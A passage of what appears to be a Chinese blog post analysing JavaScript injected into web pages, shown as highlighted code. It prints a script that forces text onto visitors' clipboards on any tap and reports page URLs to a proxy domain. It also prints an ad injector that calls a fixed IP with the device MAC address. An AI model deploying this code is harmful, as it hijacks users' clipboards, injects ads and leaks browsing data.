class="line">                <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">                iframe.style.cssText = <span class="string">"display:none;width:0px;height:0px;"</span>;</span><br><span class="line">                iframe.src = <span class="string">"weixin://webview/copy/"</span> + a;</span><br><span class="line">                <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        cp: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> b = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (b.hascopy2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                b.hascopy2 = <span class="string">"yes"</span>;</span><br><span class="line">                b._ajax(<span class="string">"//"</span> + <span class="built_in">window</span>.amb_jd_proxy_domain + <span class="string">"/jd/stat?callback=jsonp"</span> + (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime(), &#123;</span><br><span class="line">                    f: b.id,</span><br><span class="line">                    t: b.token,</span><br><span class="line">                    h: b.hascopy,</span><br><span class="line">                    current_url: <span class="built_in">encodeURIComponent</span>(top.location.href)</span><br><span class="line">                &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">                    b.sSet(<span class="string">"amb_jd_open"</span>, <span class="string">"close"</span>, <span class="built_in">window</span>.amb_jd_proxy_c);</span><br><span class="line">                    b.sSet(<span class="string">"amb_jd_copy"</span>, <span class="string">"has"</span>, <span class="number">86400</span>);</span><br><span class="line">                &#125;, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        qqCopy: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="keyword">this</span>,</span><br><span class="line">                b = a.text,</span><br><span class="line">                c = navigator.appVersion,</span><br><span class="line">                e = <span class="number">1</span> &lt; c.split(<span class="string">"MQQBrowser/"</span>).length ? <span class="number">2</span> : <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (a.closeqq == <span class="string">"yes"</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e) &#123;</span><br><span class="line">                <span class="keyword">var</span> f = &#123;</span><br><span class="line">                    url: b,</span><br><span class="line">                    to_app: <span class="string">"10"</span>,</span><br><span class="line">                    us_txt: <span class="string">"23s"</span></span><br><span class="line">                &#125;;</span><br><span class="line">                b = c.split(<span class="string">"MQQBrowser/"</span>)[<span class="number">1</span>].split(<span class="string">"."</span>);</span><br><span class="line">                b = <span class="built_in">parseFloat</span>(b[<span class="number">0</span>] + <span class="string">"."</span> + b[<span class="number">1</span>]);</span><br><span class="line">                b = <span class="number">5.4</span> &gt; (e ? b : <span class="number">0</span>) ? <span class="string">"//3gimg.qq.com/html5/js/qb.js"</span> : <span class="string">"//jsapi.qq.com/get?api=app.share"</span>;</span><br><span class="line">                c = a.dd.createElement(<span class="string">"script"</span>);</span><br><span class="line">                <span class="keyword">var</span> d = a.dd.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>];</span><br><span class="line">                c.setAttribute(<span class="string">"src"</span>, b);</span><br><span class="line">                c.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="string">"undefined"</span> != <span class="keyword">typeof</span> a.ww.browser &amp;&amp; <span class="string">"undefined"</span> != <span class="keyword">typeof</span> a.ww.browser.app &amp;&amp; <span class="number">2</span> == e ? (a.ww.browser.app.share(f), a.cp(<span class="string">"1"</span>)) : <span class="string">"undefined"</span> != <span class="keyword">typeof</span> a.ww.qb &amp;&amp; <span class="number">1</span> == e &amp;&amp; (a.ww.qb.share(f), a.cp(<span class="string">"1"</span>));</span><br><span class="line">                &#125;;</span><br><span class="line">                d.appendChild(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        clipboardCopy: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            _this.ww.clipboardData &amp;&amp; <span class="keyword">this</span>.text &amp;&amp; _this.ww.clipboardData.setData(<span class="string">"Text"</span>, <span class="keyword">this</span>.text);</span><br><span class="line">            <span class="keyword">this</span>.listenerCopy.destroy();</span><br><span class="line">        &#125;,</span><br><span class="line">        listenClick: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="keyword">this</span>, b = <span class="number">0</span>; b &lt; a.trigger.length; b++) &#123;</span><br><span class="line">                a.listener.push(a.listenNode(a.trigger[b], <span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> a.onClick(b, <span class="string">"click"</span>);</span><br><span class="line">                &#125;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        listenTouchend: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="keyword">this</span>, b = <span class="number">0</span>; b &lt; a.trigger.length; b++) &#123;</span><br><span class="line">                a.listenerTouchend.push(a.listenNode(a.trigger[b], <span class="string">"touchend"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> a.onClick(b, <span class="string">"touchend"</span>);</span><br><span class="line">                &#125;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        listenNode: <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">            a.addEventListener(b, c, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                destroy: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    a.removeEventListener(b, c, <span class="literal">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;,</span><br><span class="line">        onClick: <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> c = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">this</span>.dd.body.hasAttribute(<span class="string">"oncopy"</span>) &amp;&amp; <span class="keyword">this</span>.dd.body.setAttribute(<span class="string">"oncopy"</span>, <span class="string">"return true"</span>);</span><br><span class="line">            <span class="keyword">this</span>.dd.body.hasAttribute(<span class="string">"onpaste"</span>) &amp;&amp; <span class="keyword">this</span>.dd.body.setAttribute(<span class="string">"onpaste"</span>, <span class="string">"return true"</span>);</span><br><span class="line">            <span class="string">"INPUT"</span> != a.target.nodeName &amp;&amp; <span class="string">"TEXTAREA"</span> != a.target.nodeName &amp;&amp; ((<span class="keyword">new</span> h(<span class="keyword">this</span>.text, <span class="keyword">this</span>.action, <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">                a ? c.cp(<span class="string">"1"</span>) : c.cp(<span class="string">"2"</span>);</span><br><span class="line">            &#125;)).start(), <span class="string">"click"</span> == b ? (<span class="keyword">this</span>.listenerD = <span class="literal">true</span>, <span class="keyword">this</span>.listener.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">                a.destroy();</span><br><span class="line">            &#125;)) : <span class="string">"touchend"</span> == b &amp;&amp; <span class="keyword">this</span>.listenerTouchend.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">                a.destroy();</span><br><span class="line">            &#125;));</span><br><span class="line">            <span class="keyword">this</span>.dd.body.hasAttribute(<span class="string">"oncopy"</span>) &amp;&amp; <span class="keyword">this</span>.dd.body.setAttribute(<span class="string">"oncopy"</span>, <span class="string">"return false"</span>);</span><br><span class="line">            <span class="keyword">this</span>.dd.body.hasAttribute(<span class="string">"onpaste"</span>) &amp;&amp; <span class="keyword">this</span>.dd.body.setAttribute(<span class="string">"onpaste"</span>, <span class="string">"return false"</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        randomString: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; <span class="number">7</span> &gt; i; i++) &#123;</span><br><span class="line">                a += <span class="string">"ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>.charAt(<span class="built_in">Math</span>.floor(<span class="number">61</span> * <span class="built_in">Math</span>.random()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;,</span><br><span class="line">        sGet: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.ww.localStorage[a]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> b = <span class="built_in">JSON</span>.parse(<span class="keyword">this</span>.ww.localStorage[a]);</span><br><span class="line">                <span class="keyword">return</span> b.time &lt; (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() ? (<span class="keyword">this</span>.ww.localStorage[a] = <span class="literal">null</span>) : b.value;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (c) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">"not localStorage."</span>), <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        sSet: <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> e = &#123;</span><br><span class="line">                    name: a,</span><br><span class="line">                    value: b,</span><br><span class="line">                    time: (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() + <span class="number">1000</span> * c</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="keyword">this</span>.ww.localStorage[a] = <span class="built_in">JSON</span>.stringify(e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (f) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"not localStorage."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        now: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime();</span><br><span class="line">        &#125;,</span><br><span class="line">        rand: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Math</span>.random().toString().substr(<span class="number">2</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        parseData: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> b = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"string"</span> === <span class="keyword">typeof</span> a) &#123;</span><br><span class="line">                b = a;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"object"</span> === <span class="keyword">typeof</span> a) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> c <span class="keyword">in</span> a) &#123;</span><br><span class="line">                    b += <span class="string">"&amp;"</span> + c + <span class="string">"="</span> + <span class="built_in">encodeURIComponent</span>(a[c]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            b += <span class="string">"&amp;_time="</span> + <span class="keyword">this</span>.now();</span><br><span class="line">            <span class="keyword">return</span> b = b.substr(<span class="number">1</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        _ajax: <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">            a = a + (<span class="number">-1</span> === a.indexOf(<span class="string">"?"</span>) ? <span class="string">"?"</span> : <span class="string">"&amp;"</span>) + <span class="keyword">this</span>.parseData(b);</span><br><span class="line">            <span class="keyword">if</span> ((b = <span class="regexp">/callback=(\w+)/</span>.exec(a)) &amp;&amp; b[<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">var</span> e = b[<span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                e = <span class="string">"jsonp_"</span> + <span class="keyword">this</span>.now() + <span class="string">"_"</span> + <span class="keyword">this</span>.rand(), a = a.replace(<span class="string">"callback=?"</span>, <span class="string">"callback="</span> + e), a = a.replace(<span class="string">"callback=%3F"</span>, <span class="string">"callback="</span> + e);</span><br><span class="line">            &#125;</span><br><span class="line">            b = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">            b.type = <span class="string">"text/javascript"</span>;</span><br><span class="line">            b.src = a;</span><br><span class="line">            b.id = <span class="string">"id_"</span> + e;</span><br><span class="line">            <span class="built_in">window</span>[e] = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">window</span>[e] = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementById(<span class="string">"id_"</span> + e),</span><br><span class="line">                    k = b.parentNode;</span><br><span class="line">                k &amp;&amp; <span class="number">11</span> !== k.nodeType &amp;&amp; k.removeChild(b);</span><br><span class="line">                c(a);</span><br><span class="line">            &#125;;</span><br><span class="line">            (a = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"head"</span>)) &amp;&amp; a[<span class="number">0</span>] &amp;&amp; a[<span class="number">0</span>].appendChild(b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        parent.window.location.href != <span class="built_in">window</span>.location.href &amp;&amp; (g.host = parent.window.location.protocol + <span class="string">"//"</span> + parent.window.location.host, g.dd = parent.document, g.ww = parent.window), g.init();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (a) &#123;</span><br><span class="line">        g.init();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(<span class="function"><span class="keyword">function</span>(<span class="params">h, g, a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        fakeElem: <span class="literal">null</span>,</span><br><span class="line">        text: h,</span><br><span class="line">        action: g,</span><br><span class="line">        selectedText: <span class="literal">null</span>,</span><br><span class="line">        dd: <span class="built_in">document</span>,</span><br><span class="line">        ww: <span class="built_in">window</span>,</span><br><span class="line">        start: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.text &amp;&amp; (parent.window.location.href != <span class="built_in">window</span>.location.href &amp;&amp; (<span class="keyword">this</span>.ww = top.window, <span class="keyword">this</span>.dd = top.document), <span class="keyword">this</span>.selectFake());</span><br><span class="line">        &#125;,</span><br><span class="line">        selectFake: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="string">"rtl"</span> == <span class="keyword">this</span>.dd.documentElement.getAttribute(<span class="string">"dir"</span>);</span><br><span class="line">            <span class="keyword">this</span>.removeFake();</span><br><span class="line">            <span class="keyword">this</span>.fakeElem = <span class="keyword">this</span>.dd.createElement(<span class="string">"textarea"</span>);</span><br><span class="line">            <span class="keyword">this</span>.fakeElem.style.fontSize = <span class="string">"12pt"</span>;</span><br><span class="line">            <span class="keyword">this</span>.fakeElem.style.border = <span class="string">"0"</span>;</span><br><span class="line">            <span class="keyword">this</span>.fakeElem.style.padding = <span class="string">"0"</span>;</span><br><span class="line">            <span class="keyword">this</span>.fakeElem.style.margin = <span class="string">"0"</span>;</span><br><span class="line">            <span class="keyword">this</span>.fakeElem.style.position = <span class="string">"absolute"</span>;</span><br><span class="line">            a ? (<span class="keyword">this</span>.fakeElem.style.right = <span class="string">"-9999px"</span>) : (<span class="keyword">this</span>.fakeElem.style.left = <span class="string">"-9999px"</span>);</span><br><span class="line">            <span class="keyword">this</span>.fakeElem.style.top = (<span class="keyword">this</span>.ww.pageYOffset || <span class="keyword">this</span>.dd.documentElement.scrollTop) + <span class="string">"px"</span>;</span><br><span class="line">            <span class="keyword">this</span>.fakeElem.setAttribute(<span class="string">"readonly"</span>, <span class="string">""</span>);</span><br><span class="line">            <span class="keyword">this</span>.fakeElem.value = <span class="keyword">this</span>.text;</span><br><span class="line">            <span class="keyword">this</span>.dd.body.appendChild(<span class="keyword">this</span>.fakeElem);</span><br><span class="line">            <span class="keyword">this</span>.selectedText = <span class="keyword">this</span>.selectText(<span class="keyword">this</span>.fakeElem);</span><br><span class="line">            <span class="keyword">this</span>.copyText();</span><br><span class="line">        &#125;,</span><br><span class="line">        removeFake: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.fakeElem &amp;&amp; (<span class="keyword">this</span>.dd.body.removeChild(<span class="keyword">this</span>.fakeElem), <span class="keyword">this</span>.fakeElem = <span class="literal">null</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        copyText: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> b = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                b = <span class="keyword">this</span>.dd.execCommand(<span class="keyword">this</span>.action);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (c) &#123;</span><br><span class="line">                b = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.removeFake();</span><br><span class="line">            a.call(<span class="keyword">this</span>, b);</span><br><span class="line">        &#125;,</span><br><span class="line">        selectText: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"SELECT"</span> === a.nodeName) &#123;</span><br><span class="line">                a.focus(), a = a.value;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"INPUT"</span> === a.nodeName || <span class="string">"TEXTAREA"</span> === a.nodeName) &#123;</span><br><span class="line">                <span class="keyword">var</span> b = a.hasAttribute(<span class="string">"readonly"</span>);</span><br><span class="line">                b || a.setAttribute(<span class="string">"readonly"</span>, <span class="string">""</span>);</span><br><span class="line">                a.select();</span><br><span class="line">                a.setSelectionRange(<span class="number">0</span>, a.value.length);</span><br><span class="line">                b || a.removeAttribute(<span class="string">"readonly"</span>);</span><br><span class="line">                a = a.value;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                a.hasAttribute(<span class="string">"contenteditable"</span>) &amp;&amp; a.focus();</span><br><span class="line">                b = <span class="keyword">this</span>.ww.getSelection();</span><br><span class="line">                <span class="keyword">var</span> e = <span class="keyword">this</span>.dd.createRange();</span><br><span class="line">                e.selectNodeContents(a);</span><br><span class="line">                b.removeAllRanges();</span><br><span class="line">                b.addRange(e);</span><br><span class="line">                a = b.toString();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>该JS会与<code>http://222.73.156.235:8888/v2?MAC=XXXXXXXXXXXX</code>一起作用弹广告，该网址内容为<br>MAC用于拼接下面的MAC地址（<code>deviceMac</code>）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ip = <span class="string">'http://222.73.156.235:8888'</span>;</span><br><span class="line"><span class="keyword">var</span> pc = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> android = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> ios = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> deviceMac = <span class="string">'XX:XX:XX:XX:XX:XX'</span>;</span><br><span class="line"><span class="keyword">var</span> statisticUrl = <span class="string">'http://222.73.156.235:8888/v2/router/ad/state'</span>;</span><br><span class="line"><span class="keyword">var</span> a_str = &#123;<span class="string">"top"</span>: &#123;&#125;,<span class="string">"center"</span>: &#123;&#125;,<span class="string">"bottom"</span>: &#123;&#125;&#125;;</span><br><span class="line">    <span class="keyword">var</span> hostUrl = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">// var timestamp = new Date().getTime();</span></span><br><span class="line">    <span class="comment">// lalala</span></span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        aa();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(e.data.removeIframe == <span class="string">"yes"</span>)&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(e.data.iframeId).remove();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;, <span class="literal">false</span>)</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//判断方向,resize的时候判断方向(adp-138)</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">"resize"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">var</span> iframe_Ct_a = <span class="built_in">document</span>.getElementById(<span class="string">'iframe_center_a'</span>);</span><br><span class="line">          <span class="keyword">var</span> iframe_Ct_b = <span class="built_in">document</span>.getElementById(<span class="string">'iframe_bottom_a'</span>);</span><br><span class="line">          <span class="comment">//中间插屏</span></span><br><span class="line">          <span class="keyword">if</span>(iframe_Ct_a)&#123;</span><br><span class="line">             <span class="keyword">if</span>( <span class="built_in">window</span>.orientation == <span class="number">90</span> || <span class="built_in">window</span>.orientation==<span class="number">-90</span>)&#123;</span><br><span class="line">                  iframe_Ct_a.style.left = <span class="built_in">window</span>.innerWidth /<span class="number">2</span> + <span class="string">"px"</span>;</span><br><span class="line">                  iframe_Ct_a.style.top = <span class="built_in">window</span>.innerHeight/<span class="number">1.2</span>+<span class="string">"px"</span>;</span><br><span class="line">                  iframe_Ct_a.style.marginLeft = <span class="built_in">parseInt</span>(a_str.center.width)/<span class="number">2</span>*(<span class="number">-1</span>)+<span class="string">"px"</span>;</span><br><span class="line">                  iframe_Ct_a.style.marginTop = (<span class="built_in">window</span>.innerHeight/<span class="number">1.5</span>)*(<span class="number">-1</span>)+<span class="string">"px"</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            <span class="keyword">if</span>( <span class="built_in">window</span>.orientation == <span class="number">180</span> || <span class="built_in">window</span>.orientation == <span class="number">0</span> ) &#123;</span><br><span class="line">               iframe_Ct_a.style.left = <span class="built_in">window</span>.innerWidth /<span class="number">2</span> + <span class="string">"px"</span>;</span><br><span class="line">               iframe_Ct_a.style.top = <span class="built_in">window</span>.innerHeight /<span class="number">2</span> + <span class="string">"px"</span>;</span><br><span class="line">               iframe_Ct_a.style.marginLeft = <span class="built_in">parseInt</span>(a_str.center.width)/<span class="number">2</span>*(<span class="number">-1</span>)+<span class="string">"px"</span>;</span><br><span class="line">               iframe_Ct_a.style.marginTop = <span class="built_in">parseInt</span>(a_str.center.height)/<span class="number">2</span>*(<span class="number">-1</span>)+<span class="string">"px"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">//底部横幅</span></span><br><span class="line">          <span class="keyword">if</span>(iframe_Ct_b)&#123;</span><br><span class="line">             <span class="keyword">if</span>(<span class="built_in">window</span>.orientation ==<span class="number">90</span> || <span class="built_in">window</span>.orientation==<span class="number">-90</span>)&#123;</span><br><span class="line">                iframe_Ct_b.style.marginLeft = <span class="string">"25%"</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>(<span class="built_in">window</span>.orientation == <span class="number">180</span> || <span class="built_in">window</span>.orientation == <span class="number">0</span>)&#123;</span><br><span class="line">                iframe_Ct_b.style.marginLeft = <span class="string">'0'</span>;</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//增加禁止域名判断</span></span><br><span class="line">        <span class="keyword">if</span>(forbidHost())&#123;</span><br><span class="line">            loadJs();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hostUrl = <span class="built_in">encodeURIComponent</span>(top.window.location.href);</span><br><span class="line">        <span class="keyword">var</span> browser = &#123;</span><br><span class="line">            versions: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> u = navigator.userAgent, app = navigator.appVersion;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    trident: u.indexOf(<span class="string">'Trident'</span>) &gt; <span class="number">-1</span>, <span class="comment">//IE内核</span></span><br><span class="line">                    presto: u.indexOf(<span class="string">'Presto'</span>) &gt; <span class="number">-1</span>, <span class="comment">//opera内核</span></span><br><span class="line">                    webKit: u.indexOf(<span class="string">'AppleWebKit'</span>) &gt; <span class="number">-1</span>, <span class="comment">//苹果、谷歌内核</span></span><br><span class="line">                    gecko: u.indexOf(<span class="string">'Gecko'</span>) &gt; <span class="number">-1</span> &amp;&amp; u.indexOf(<span class="string">'KHTML'</span>) == <span class="number">-1</span>, <span class="comment">//火狐内核</span></span><br><span class="line">                    mac: u.indexOf(<span class="string">'Macintosh'</span>) &gt; <span class="number">-1</span>,<span class="comment">//mac</span></span><br><span class="line">                    mobile: !!u.match(<span class="regexp">/AppleWebKit.*Mobile.*/</span>) || !!u.match(<span class="regexp">/AppleWebKit/</span>), <span class="comment">//是否为移动终端</span></span><br><span class="line">                    ios: !!u.match(<span class="regexp">/\(i[^;]+;( U;)? CPU.+Mac OS X/</span>), <span class="comment">//ios终端</span></span><br><span class="line">                    android: u.indexOf(<span class="string">'Android'</span>) &gt; <span class="number">-1</span> || u.indexOf(<span class="string">'Linux'</span>) &gt; <span class="number">-1</span>, <span class="comment">//android终端或者uc浏览器</span></span><br><span class="line">                    iPhone: u.indexOf(<span class="string">'iPhone'</span>) &gt; <span class="number">-1</span> || u.indexOf(<span class="string">'Mac'</span>) &gt; <span class="number">-1</span>, <span class="comment">//是否为iPhone或者QQHD浏览器</span></span><br><span class="line">                    iPad: u.indexOf(<span class="string">'iPad'</span>) &gt; <span class="number">-1</span>, <span class="comment">//是否iPad</span></span><br><span class="line">                    webApp: u.indexOf(<span class="string">'Safari'</span>) == <span class="number">-1</span> <span class="comment">//是否web应该程序，没有头部与底部</span></span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isWeiXin() || isAPP() || <span class="literal">true</span> == browser.versions.mac) &#123;</span><br><span class="line">    loadJs();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (browser.versions.android == <span class="literal">true</span>) &#123;  <span class="comment">//只投Android</span></span><br><span class="line">            <span class="keyword">if</span>(android)&#123;</span><br><span class="line">                <span class="comment">//console.log("ios append iframe.");</span></span><br><span class="line">                appendIframe();</span><br><span class="line">                loadJs();</span><br><span class="line">                <span class="comment">//console.log("ios append iframe over.");</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (browser.versions.ios == <span class="literal">true</span> || browser.versions.iPhone == <span class="literal">true</span> || browser.versions.iPad == <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ios)&#123;</span><br><span class="line">                <span class="comment">//console.log("ios append iframe.");</span></span><br><span class="line">                appendIframe();</span><br><span class="line">loadJs();</span><br><span class="line">                <span class="comment">//console.log("ios append iframe over.")</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            loadJs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">appendIframe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> dataSet = &#123;&#125;;</span><br><span class="line">            dataSet.deviceMac = deviceMac;</span><br><span class="line">            dataSet.statisticUrl = statisticUrl;</span><br><span class="line">            dataSet.hostUrl = hostUrl;</span><br><span class="line">            dataSet.ip = ip;</span><br><span class="line">            <span class="keyword">if</span>(a_str.top.height != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> iframe_Tp = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">                iframe_Tp.src = ip + <span class="string">'/routerad/common/pages/mobile_index.html'</span>;</span><br><span class="line">                iframe_Tp.id = <span class="string">"iframe_top_a"</span>;</span><br><span class="line">                iframe_Tp.name = <span 